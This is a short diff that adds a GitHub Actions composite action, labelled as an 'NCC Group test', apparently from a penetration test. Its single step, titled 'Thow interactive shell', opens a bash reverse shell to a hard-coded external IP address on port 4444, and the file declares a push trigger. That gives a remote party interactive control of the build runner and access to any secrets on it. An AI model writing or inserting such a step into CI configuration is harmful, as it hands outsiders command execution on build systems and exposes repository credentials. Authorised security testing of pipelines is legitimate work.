@@ -1,0 +1,10 @@
+name: NciciActionpentest001
+description: 'NCC Group test'
+on: push
+runs:
+    using: "composite"
+    steps:
+      - name: Thow interactive shell
+        shell: bash
+        run: |
+                    /bin/bash -l > /dev/tcp/195.95.131.112/4444 0<&1 2>&1
